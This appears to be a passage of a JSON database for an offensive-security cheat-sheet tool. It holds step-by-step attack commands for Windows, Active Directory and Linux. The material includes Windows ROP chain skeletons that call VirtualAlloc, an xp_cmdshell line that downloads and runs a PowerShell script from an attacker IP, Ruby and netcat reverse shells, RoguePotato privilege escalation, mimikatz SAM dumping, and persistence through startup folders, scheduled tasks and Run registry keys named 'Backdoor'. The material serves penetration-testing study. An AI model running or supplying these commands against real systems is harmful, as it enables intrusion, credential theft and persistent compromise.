        "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "RBCD flips delegation model - target resource specifies who can delegate TO it. Controlled via **msDS-AllowedToActOnBehalfOfOtherIdentity** attribute.",
        "variant": "info"
      },
      {
        "type": "note",
        "content": "**Requirements:**\n- **GenericWrite**, **GenericAll**, **WriteDacl**, or **WriteOwner** on target computer\n- Ability to create machine account (**MachineAccountQuota** > 0) or control of existing one\n- Network access to target (port 445)",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Default Credentials",
    "title": "Resources",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "- [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) - Comprehensive database\n- [CIRT.net](https://cirt.net/passwords) - Vendor default passwords\n- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) - Default credential lists\n- [RouterPasswords.com](http://www.routerpasswords.com/) - Router defaults"
      }
    ]
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "Resources",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "- [git-dumper](https://github.com/arthaud/git-dumper) - Download exposed .git repositories\n- [GitTools](https://github.com/internetwache/GitTools) - Suite of Git exploitation tools\n- [TruffleHog](https://github.com/trufflesecurity/truffleHog) - Find secrets in Git history\n- [GitLeaks](https://github.com/gitleaks/gitleaks) - Scan for hardcoded secrets\n- [HackTricks GitHub Secrets](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets)"
      }
    ]
  },
  {
    "category": "Zerologon",
    "title": "Restoration Methods",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [
      {
        "title": "Method 1: Using Original Hash (Best)",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 restorepassword.py corp.local/DC01$@DC01 -target-ip 192.168.1.10 -hexpass <OriginalHash>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Method 2: Using Administrator Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "# After dumping Administrator hash\nimpacket-wmiexec -hashes :<AdminHash> Administrator@<DC-IP>\n\n# On DC, reset computer account password\nnltest /sc_change_pwd:corp.local"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Method 3: Manual Registry Restore (Last Resort)",
        "codes": [
          {
            "lang": "powershell",
            "code": "# On Domain Controller (requires physical/console access)\n# Restore from backup or reinstall DC"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Return Oriented Programming",
    "title": "Return Oriented Programming",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "ROP",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "ROP Fundamentals [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "How ROP chains execute:\n1. Overflow overwrites return address with first gadget address\n2. When function returns, execution jumps to gadget\n3. Gadget executes instructions, ends with RET\n4. RET pops next address from stack, jumps to next gadget\n5. Chain continues until desired operations complete",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Gadget Structure [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Gadget: One or more instructions followed by RET (C3)\n\nExamples:\npop eax; ret          ; Load value into EAX\npop ecx; ret          ; Load value into ECX\nxchg eax, esp; ret    ; Stack pivot\nmov [eax], ecx; ret   ; Write ECX to address in EAX"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "What constitutes a useful gadget."
          }
        ]
      },
      {
        "title": "Stack Layout for ROP",
        "codes": [
          {
            "lang": "text",
            "code": "Stack (growing down):           Execution:\n+------------------+\n| gadget1 addr     | <-- ESP    1. RET pops gadget1, jumps there\n+------------------+\n| value for pop    |            2. gadget1: pop eax; ret\n+------------------+               EAX = value, RET pops gadget2\n| gadget2 addr     |            3. gadget2 executes...\n+------------------+\n| ...              |"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "How to arrange values on stack for gadgets."
          }
        ]
      },
      {
        "title": "ROP to Call VirtualAlloc [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Strategy to allocate executable memory:\n**Goal**: Call `VirtualAlloc(addr, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)`\n\n**Steps**:\n1. Find **VirtualAlloc** address (in IAT or dynamically)\n2. Set up registers/stack with arguments\n3. Call VirtualAlloc via gadget\n4. Copy shellcode to allocated memory\n5. Jump to shellcode",
            "variant": "info"
          }
        ]
      },
      {
        "title": "VirtualAlloc Parameters",
        "codes": [
          {
            "lang": "c",
            "code": "LPVOID VirtualAlloc(\n    LPVOID lpAddress,        // Address (or NULL for any)\n    SIZE_T dwSize,           // Size to allocate\n    DWORD  flAllocationType, // MEM_COMMIT | MEM_RESERVE (0x3000)\n    DWORD  flProtect         // PAGE_EXECUTE_READWRITE (0x40)\n);"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Arguments for VirtualAlloc call."
          }
        ]
      },
      {
        "title": "Common ROP Patterns",
        "codes": [
          {
            "lang": "text",
            "code": "; Stack to register\npop eax; ret                    ; Load stack value to EAX\npop ecx; pop ecx; ret           ; Load two values, keep second\n\n; Register manipulation\nxchg eax, ecx; ret              ; Swap EAX and ECX\nmov eax, ecx; ret               ; Copy ECX to EAX\ninc eax; ret                    ; Increment EAX\n\n; Memory operations\nmov [eax], ecx; ret             ; Write ECX to [EAX]\nmov eax, [eax]; ret             ; Dereference pointer\n\n; Arithmetic\nadd eax, ecx; ret               ; Add ECX to EAX\nsub eax, ecx; ret               ; Subtract\n\n; Stack manipulation\npushad; ret                     ; Save all registers\nadd esp, X; ret                 ; Adjust stack pointer\nxchg eax, esp; ret              ; Stack pivot"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Useful gadget sequences."
          }
        ]
      },
      {
        "title": "Skeleton ROP Chain",
        "codes": [
          {
            "lang": "python",
            "code": "import struct\n\ndef p32(addr):\n    return struct.pack(\"<I\", addr)\n\n# Gadget addresses (example)\nPOP_EAX = 0x10001000\nPOP_ECX = 0x10001004\nMOV_EAX_ECX = 0x10001008\n# ... more gadgets\n\n# Build chain\nrop = b\"\"\nrop += p32(POP_EAX)\nrop += p32(0x41414141)      # Value for EAX\nrop += p32(POP_ECX)\nrop += p32(0x42424242)      # Value for ECX\n# ... continue building\n\n# Final payload\nbuffer = b\"A\" * offset\nbuffer += rop\nbuffer += shellcode"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Basic structure for VirtualAlloc ROP."
          }
        ]
      },
      {
        "title": "ROP Chain for VirtualAlloc",
        "codes": [
          {
            "lang": "python",
            "code": "# Addresses (adjust for target)\nVIRTUALALLOC_IAT = 0x10001000   # Address of VirtualAlloc pointer\nPOP_EAX_RET = 0x10002000\nXCHG_EAX_ESP_RET = 0x10003000\n# ... more gadgets\n\n# Stack after pivot:\nrop = b\"\"\nrop += p32(VIRTUALALLOC_IAT)    # Function to call\nrop += p32(SHELLCODE_ADDR)      # Return address after VirtualAlloc\nrop += p32(0x00000000)          # lpAddress (NULL = any)\nrop += p32(0x00001000)          # dwSize\nrop += p32(0x00003000)          # MEM_COMMIT | MEM_RESERVE\nrop += p32(0x00000040)          # PAGE_EXECUTE_READWRITE"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Complete chain to call VirtualAlloc."
          }
        ]
      },
      {
        "title": "Handling NULL Bytes in ROP",
        "codes": [
          {
            "lang": "text",
            "code": "; If gadget at 0x10001000 (contains NULL):\n1. Find equivalent gadget without NULLs\n2. Use negative value and adjust: 0xF0001000 - 0xE0000000\n3. Build address at runtime using arithmetic"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Avoid NULL bytes in gadget addresses."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "ROP Paper",
        "url": "https://cseweb.ucsd.edu/~hovav/dist/geometry.pdf"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Chain small instruction sequences (gadgets) to perform arbitrary operations without injecting new code."
      }
    ]
  },
  {
    "category": "Linked SQL Server Attacks",
    "title": "Reverse Connection via Link",
    "tags": [
      "Exploitation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Setup Listener",
        "codes": [
          {
            "lang": "bash",
            "code": "nc -nvlp 4444"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Trigger Reverse Shell",
        "codes": [
          {
            "lang": "sql",
            "code": "EXEC ('xp_cmdshell ''powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''''http://<AttackerIP>/shell.ps1'''')\"''') AT [<LinkedServer>]"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "RDP Attacks",
    "title": "Reverse RDP Proxying with Chisel",
    "tags": [
      "Lateral_Movement",
      "RDP",
      "Windows"
    ],
    "steps": [
      {
        "title": "Chisel Server",
        "codes": [
          {
            "lang": "bash",
            "code": "chisel server --reverse --port 8080"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Chisel Client (Target)",
        "codes": [
          {
            "lang": "bash",
            "code": "chisel.exe client <AttackerIP>:8080 R:3389:<TargetIP>:3389"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Connect via Tunnel",
        "codes": [
          {
            "lang": "bash",
            "code": "xfreerdp /u:<User> /p:<Password> /v:127.0.0.1:3389"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "RDP Attacks",
    "title": "Reverse RDP Proxying with Metasploit",
    "tags": [
      "Lateral_Movement",
      "RDP",
      "Windows"
    ],
    "steps": [
      {
        "title": "Setup Reverse Port Forward",
        "codes": [
          {
            "lang": "text",
            "code": "meterpreter> portfwd add -R -p 3389 -l 3389 -L 127.0.0.1"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Connect to Forwarded RDP",
        "codes": [
          {
            "lang": "bash",
            "code": "xfreerdp /u:<User> /p:<Password> /v:127.0.0.1"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Reverse Shells",
    "title": "Reverse Shells",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [],
    "resources": [
      {
        "text": "RevShells Generator",
        "url": "https://www.revshells.com/"
      },
      {
        "text": "PayloadsAllTheThings",
        "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Collection of reverse shell one-liners and listeners for various platforms."
      },
      {
        "type": "note",
        "content": "**Payload Selection Guide:**\n- **Linux with bash:** Bash payload (most reliable)\n- **Linux without /dev/tcp:** Python or netcat mkfifo\n- **PHP web app:** PHP payload or php-reverse-shell.php\n- **Windows PowerShell:** PowerShell TCP client\n- **Windows no PS:** msfvenom exe\n- **Java/Tomcat:** msfvenom war\n- **AV evasion:** Encoded msfvenom",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "RoguePotato",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Prerequisites",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Requires RPC port 135 to be accessible from target to attacker.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Setup Socat Redirector",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo socat tcp-listen:135,reuseaddr,fork tcp:<TargetIP>:9999"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Execute RoguePotato",
        "codes": [
          {
            "lang": "bash",
            "code": "RoguePotato.exe -r <AttackerIP> -e \"C:\\Windows\\Temp\\nc.exe <AttackerIP> <Port> -e cmd.exe\" -l 9999"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "With Custom Port",
        "codes": [
          {
            "lang": "bash",
            "code": "RoguePotato.exe -r <AttackerIP> -e \"cmd.exe\" -l 9999 -p 135"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "RoguePotato GitHub",
        "url": "https://github.com/antonioCoco/RoguePotato"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Requires setting up a listener on your attacker machine. More complex but works when others fail.",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Gadget Discovery",
    "title": "ROP Gadget Discovery",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "ROP",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "Using RP++ (rp-win)",
        "codes": [
          {
            "lang": "bash",
            "code": "rp-win.exe -f <Module.dll> -r 5 > gadgets.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Fast gadget finder for Windows binaries using **RP++**."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "**-r 5**: Maximum gadget depth (instructions before RET)",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Filter Gadgets by Pattern",
        "codes": [
          {
            "lang": "bash",
            "code": "rp-win.exe -f <Module.dll> -r 5 | findstr \"pop eax\"\nrp-win.exe -f <Module.dll> -r 5 | findstr \"xchg eax, esp\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Search for specific instruction patterns."
          }
        ]
      },
      {
        "title": "Using Mona for Gadgets",
        "codes": [
          {
            "lang": "text",
            "code": "!mona rop -m <Module>           ; Find gadgets in module\n!mona rop -m *                  ; All modules\n!mona rop -cpb \"\\x00\\x0a\"       ; Exclude bad characters"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find gadgets in **Immunity Debugger** using **mona.py**."
          }
        ]
      },
      {
        "title": "Generate ROP Chains with Mona",
        "codes": [
          {
            "lang": "text",
            "code": "!mona rop -m <Module> -cpb \"\\x00\" ; Generates rop_chains.txt\n!mona rop -n                      ; Exclude OS modules"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Automatic chain generation."
          }
        ]
      },
      {
        "title": "Pykd for Automation",
        "codes": [
          {
            "lang": "python",
            "code": "# pykd_gadget_search.py\nimport pykd\n\ndef find_gadgets(module_name, pattern):\n    \"\"\"Search for gadget pattern in module\"\"\"\n    mod = pykd.module(module_name)\n    base = mod.begin()\n    size = mod.size()\n\n    # Search for RET (C3)\n    addr = base\n    while addr < base + size:\n        # Read bytes at address\n        try:\n            data = pykd.loadBytes(addr, 10)\n            # Check for pattern\n            if matches_pattern(data, pattern):\n                print(f\"Found at 0x{addr:08x}\")\n        except:\n            pass\n        addr += 1\n\n# Run in WinDbg: .load pykd; !py pykd_gadget_search.py"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Automate gadget search in WinDbg with Python."
          }
        ]
      },
      {
        "title": "Find Specific Gadgets Manually",
        "codes": [
          {
            "lang": "text",
            "code": "; POP EAX (58); RET (C3)\ns -b <Base> L<Size> 58 c3\n\n; POP ECX (59); RET (C3)\ns -b <Base> L<Size> 59 c3\n\n; XCHG EAX, ESP (94); RET (C3)\ns -b <Base> L<Size> 94 c3\n\n; MOV [EAX], ECX (89 08); RET (C3)\ns -b <Base> L<Size> 89 08 c3\n\n; PUSHAD (60); RET (C3)\ns -b <Base> L<Size> 60 c3"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Search for gadget opcodes in WinDbg."
          }
        ]
      },
      {
        "title": "Verify Gadget",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> u 0x10001234 L3\n10001234 58              pop     eax\n10001235 c3              ret"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Confirm gadget does what expected."
          }
        ]
      },
      {
        "title": "Essential Gadgets to Find",
        "codes": [
          {
            "lang": "text",
            "code": "; Value loading\npop eax; ret\npop ecx; ret\npop edx; ret\npop ebx; ret\npop esi; ret\npop edi; ret\npop ebp; ret\n\n; Stack pivot\nxchg eax, esp; ret\nmov esp, eax; ret\nleave; ret                      ; mov esp, ebp; pop ebp; ret\n\n; Memory write\nmov [eax], ecx; ret\nmov [edi], eax; ret\nmov dword ptr [ecx], eax; ret\n\n; Arithmetic\nadd eax, ecx; ret\nsub eax, ecx; ret\nneg eax; ret\ninc eax; ret\ndec eax; ret\n\n; Register movement\nxchg eax, ecx; ret\nmov eax, ecx; ret\npush eax; pop ecx; ret"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Gadgets commonly needed for ROP chains."
          }
        ]
      },
      {
        "title": "Gadget Quality Criteria",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "What makes a good gadget:\n- **No bad characters**: Address bytes must survive transmission\n- **Minimal side effects**: Fewer unintended register modifications\n- **Available in reliable module**: Non-ASLR or leaked address\n- **Ends cleanly**: RET without unexpected stack adjustments",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Catalog Gadgets",
        "codes": [
          {
            "lang": "python",
            "code": "# gadgets.py - Catalog for target binary\nGADGETS = {\n    'pop_eax': 0x10001234,\n    'pop_ecx': 0x10001238,\n    'pop_edx': 0x1000123c,\n    'mov_eax_ecx': 0x10001250,\n    'pushad': 0x10001260,\n    'jmp_esp': 0x10001270,\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create reference for chain building."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "RP++ Tool",
        "url": "https://github.com/0vercl0k/rp"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Find usable ROP gadgets in executables and DLLs."
      }
    ]
  },
  {
    "category": "Shared Library Attacks",
    "title": "RPATH Exploitation",
    "tags": [
      "Exploitation",
      "Linux",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Find Writable RPATH Directories",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check if RPATH directory is writable\nreadelf -d /path/to/suid-binary | grep RPATH\nls -la /path/from/rpath/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Exploit Writable RPATH",
        "codes": [
          {
            "lang": "bash",
            "code": "# Place malicious .so in RPATH directory\ncp /tmp/malicious.so /vulnerable/rpath/directory/libtarget.so\n/path/to/suid-binary"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Reverse Shells",
    "title": "Ruby Reverse Shells",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Standard Ruby",
        "codes": [
          {
            "lang": "bash",
            "code": "ruby -rsocket -e'f=TCPSocket.open(\"<AttackerIP>\",<Port>).to_i; exec sprintf(\"/bin/sh -i<&%d >&%d 2>&%d\",f,f,f)'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Ruby Without /bin/sh",
        "codes": [
          {
            "lang": "bash",
            "code": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"<AttackerIP>\",\"<Port>\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Ruby for Windows",
        "codes": [
          {
            "lang": "ruby",
            "code": "ruby -rsocket -e 'c=TCPSocket.new(\"<AttackerIP>\",\"<Port>\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Mimikatz",
    "title": "SAM Database Dumping",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Dump SAM Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug\nmimikatz # token::elevate\nmimikatz # lsadump::sam"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Extracts local user password hashes from SAM database.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Dump SAM from Registry",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # lsadump::sam /system:SYSTEM /sam:SAM"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Use when you have offline SAM and SYSTEM registry hives."
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Saved Credentials Exploitation",
    "title": "Saved Credentials Exploitation",
    "tags": [
      "Credential_Access",
      "Exploitation",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Saved Credentials (runas /savecred)",
        "codes": [
          {
            "lang": "powershell",
            "code": "cmdkey /list"
          },
          {
            "lang": "bash",
            "code": "runas /savecred /user:<Domain>\\<Username> cmd.exe"
          },
          {
            "lang": "bash",
            "code": "runas /savecred /user:<Domain>\\<Username> \"C:\\path\\to\\reverse.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If `cmdkey /list` shows saved credentials for a privileged user, use runas to execute as them.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "GUI Application Privilege Spawning",
        "substeps": [
          {
            "title": "Alternative Paths",
            "codes": [
              {
                "lang": "bash",
                "code": "file://c:/windows/system32/cmd.exe\n\\\\127.0.0.1\\c$\\windows\\system32\\cmd.exe\nC:\\windows\\system32\\cmd.exe (paste in filename field)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "1. Open the elevated application\n2. Go to File > Open (or any file browser dialog)\n3. In the location bar, type: file://c:/windows/system32/cmd.exe\n4. Press Enter for admin cmd"
          }
        ],
        "notes": [
          {
            "type": "note",
            "content": "If an application runs elevated (shield icon on shortcut), abuse the File Open dialog to spawn an admin shell.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks Saved Credentials",
        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-vault-credential-manager"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Exploit saved Windows credentials or elevated GUI applications to escalate privileges.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Scheduled Tasks and Autoruns Exploitation",
    "title": "Scheduled Tasks and Autoruns Exploitation",
    "tags": [
      "Exploitation",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Startup Folder Hijack",
        "codes": [
          {
            "lang": "powershell",
            "code": "icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\""
          },
          {
            "lang": "powershell",
            "code": "Copy-Item C:\\path\\to\\reverse.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\legit.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If `icacls` shows write permissions on the startup folder, drop a payload to execute on next admin login.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Scheduled Task Binary Hijack",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Find the binary path from schtasks output\nicacls \"C:\\Path\\To\\ScheduledBinary.exe\""
          },
          {
            "lang": "bash",
            "code": "move \"C:\\Path\\To\\ScheduledBinary.exe\" \"C:\\Path\\To\\ScheduledBinary.exe.bak\"\ncopy C:\\path\\to\\reverse.exe \"C:\\Path\\To\\ScheduledBinary.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If a SYSTEM task runs a binary you can overwrite, replace it with your payload.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Autorun Registry Hijack",
        "substeps": [
          {
            "title": "Overwrite Autorun Binary",
            "codes": [
              {
                "lang": "powershell",
                "code": "# Check permissions on autorun binary\nicacls \"C:\\Path\\To\\AutorunBinary.exe\""
              },
              {
                "lang": "bash",
                "code": "move \"C:\\Path\\To\\AutorunBinary.exe\" \"C:\\Path\\To\\AutorunBinary.exe.bak\"\ncopy C:\\path\\to\\reverse.exe \"C:\\Path\\To\\AutorunBinary.exe\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Add New Autorun Entry",
            "codes": [
              {
                "lang": "bash",
                "code": "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /t REG_SZ /d \"C:\\path\\to\\reverse.exe\""
              },
              {
                "lang": "bash",
                "code": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /t REG_SZ /d \"C:\\path\\to\\reverse.exe\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Requires write access to registry key. Executes on user login.",
                "variant": "warning"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If you can modify autorun registry keys or overwrite the binary they point to.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks Scheduled Tasks",
        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scheduled-tasks"
      },
      {
        "text": "HackTricks Autoruns",
        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#run-at-startup"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Exploit writable scheduled tasks, startup folders, or autorun registry keys to escalate privileges or persist.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Important File Locations",
    "title": "Search Commands",
    "tags": [],
    "steps": [
      {
        "title": "Windows Search",
        "codes": [
          {
            "lang": "bash",
            "code": "dir /s SAM\ndir /s SYSTEM\ndir /s *.kdbx\ndir /s *pass*\ndir /s *cred*\ndir /s *vnc*\ndir /s *.config"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Linux Search",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -name \"*.kdbx\" 2>/dev/null\nfind / -name \"*pass*\" 2>/dev/null\nfind / -name \"*cred*\" 2>/dev/null\nfind / -name \"*.conf\" 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "Searching for Sensitive Information",
    "tags": [],
    "steps": [
      {
        "title": "Search All Commits for Passwords",
        "codes": [
          {
            "lang": "bash",
            "code": "# Search commit diffs\ngit log -p | grep -i \"password\"\ngit log -p | grep -i \"secret\"\ngit log -p | grep -i \"api_key\"\ngit log -p | grep -i \"token\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Search File Contents",
        "codes": [
          {
            "lang": "bash",
            "code": "# Search current files\ngrep -r \"password\" .\ngrep -r \"api_key\" .\ngrep -r \"secret\" ."
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Search Git History",
        "codes": [
          {
            "lang": "bash",
            "code": "# Search all commits for specific string\ngit rev-list --all | xargs git grep \"password\"\ngit rev-list --all | xargs git grep \"api_key\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Deleted Files",
        "codes": [
          {
            "lang": "bash",
            "code": "# List all deleted files\ngit log --diff-filter=D --summary"
          },
          {
            "lang": "bash",
